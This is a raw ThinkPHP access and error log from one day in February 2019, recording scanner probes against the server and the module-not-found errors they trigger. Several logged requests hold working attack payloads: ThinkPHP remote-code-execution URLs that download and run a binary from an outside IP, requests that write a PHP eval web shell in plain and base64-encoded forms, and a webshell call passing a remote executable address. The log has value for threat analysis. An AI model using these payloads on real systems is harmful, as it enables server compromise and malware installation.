[ 2019-02-25T00:14:21+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]
ERR: 无法加载模块:Cache

[ 2019-02-25T00:17:59+08:00 ] 203.195.207.52 /struts2-rest-showcase/orders.xhtml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: 无法加载模块:Struts2-rest-showcase

[ 2019-02-25T00:17:59+08:00 ] 203.195.207.52 /index.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000153s ]
ERR: 无法加载模块:Index

[ 2019-02-25T00:17:59+08:00 ] 203.195.207.52 /index.do
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
INFO: [ app_init ] --END-- [ RunTime:0.000046s ]
ERR: 无法加载模块:Index

[ 2019-02-25T06:15:37+08:00 ] 220.181.108.80 /uploads/allimg/151221/1_122121464DO7.jpg
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000099s ]
ERR: 无法加载模块:Uploads

[ 2019-02-25T08:22:37+08:00 ] 203.195.207.52 /FxCodeShell.jsp%20
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-02-25T08:22:37+08:00 ] 203.195.207.52 /FxCodeShell.jsp::$DATA
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: 无法加载模块:FxCodeShell.jsp::$DATA

[ 2019-02-25T08:22:37+08:00 ] 203.195.207.52 /FxCodeShell.jsp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-02-25T08:22:37+08:00 ] 203.195.207.52 /FxCodeShell.jsp?wiew=FxxkMyLie1836710Aa&os=1&address=http://a46.bulehero.in/download.exe
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000071s ]
ERR: 无法加载模块:FxCodeShell

[ 2019-02-25T09:08:32+08:00 ] 157.230.178.155 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http%3A%2F%2F157.230.90.135%2Fbins%2Fapep.x86%20-O%20%2Ftmp%2F.gayboi%3B%20chmod%20777%20%2Ftmp%2F.gayboi%3B%20%2Ftmp%2F.gayboi%20thinkphp.x86
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
ERR: 无法加载模块:Index

[ 2019-02-25T10:21:28+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000076s ]
ERR: 无法加载模块:Cache

[ 2019-02-25T11:49:18+08:00 ] 123.125.71.88 /uploads/allimg/151221/1_1221214644B61.jpg
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: 无法加载模块:Uploads

[ 2019-02-25T12:30:18+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),'CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E');
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000095s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:18+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:19+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=lx.php&content=CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:19+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=%3C?php%20fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='));?%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:19+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5CRequest/input&filter=phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))&data=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:19+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000082s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:19+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),'CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E')
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:19+08:00 ] 222.186.10.212 /index.php?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:20+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000075s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:20+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5CRequest/input&filter=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D&data=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:30:20+08:00 ] 222.186.10.212 /index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: 无法加载模块:Index

[ 2019-02-25T12:35:06+08:00 ] 157.230.178.155 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http%3A%2F%2F157.230.90.135%2Fbins%2Fapep.x86%20-O%20%2Ftmp%2F.gayboi%3B%20chmod%20777%20%2Ftmp%2F.gayboi%3B%20%2Ftmp%2F.gayboi%20thinkphp.x86
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
ERR: 无法加载模块:Index

[ 2019-02-25T16:14:34+08:00 ] 119.84.39.2 /zt/487.htm
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000065s ]
ERR: 无法加载模块:Zt

[ 2019-02-25T16:31:54+08:00 ] 119.84.39.2 /zt/487.htm
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000077s ]
ERR: 无法加载模块:Zt

[ 2019-02-25T18:57:32+08:00 ] 66.212.59.146 /phpmyadmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: 无法加载模块:Phpmyadmin

[ 2019-02-25T20:27:59+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: 无法加载模块:Cache

[ 2019-02-25T22:33:14+08:00 ] 34.76.18.1 /upgrade_handle.php?cmd=getupgradinginfo
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
ERR: 无法加载模块:Upgrade_handle

